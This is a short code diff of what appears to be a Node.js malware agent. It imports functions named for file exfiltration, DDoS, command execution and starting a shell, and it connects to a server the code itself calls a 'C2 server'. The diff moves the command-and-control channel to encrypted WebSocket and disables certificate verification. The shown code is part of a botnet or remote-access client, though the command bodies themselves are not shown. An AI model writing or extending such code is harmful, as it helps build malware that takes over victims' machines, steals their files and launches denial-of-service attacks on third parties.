@@ -1,9 +1,11 @@
 const WebSocket = require('ws');
 
-const { send_file_to_sv, ddos, execute, start_shell } = require ('./commands.js')
+const { send_file_to_sv, ddos, execute, start_shell } = require('./commands.js')
 
-const serverUrl = 'ws://server:3000';
-const ws = new WebSocket(serverUrl);
+const serverUrl = 'wss://server:3000';
+const ws = new WebSocket(serverUrl, {
+    rejectUnauthorized: false
+});
 
 ws.on('open', () => {
     console.log('Connected to C2 server');
